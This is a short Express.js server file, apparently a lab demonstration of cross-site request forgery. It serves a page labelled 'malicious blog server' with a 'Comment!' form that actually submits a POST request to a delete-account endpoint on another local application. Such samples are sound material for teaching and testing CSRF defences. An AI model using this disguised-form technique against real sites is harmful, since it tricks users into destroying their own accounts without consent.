var express = require('express');
var app = express();

app.get('/', function (req, res) {
  var body = 'malicious blog server';

  var form = '';
  form += '<h1>Comment</h1>';
  form += '<form action="http://localhost:5000/delete-account" method="post">'
  form += '  <textarea rows="4" cols="50">'
  form += '  </textarea>'
  form += '  <br>'
  form += '  <input type="submit" value="Comment!">'
  form += '</form>'

  res.send(body + '<br>' + form);
});

app.listen(3000);
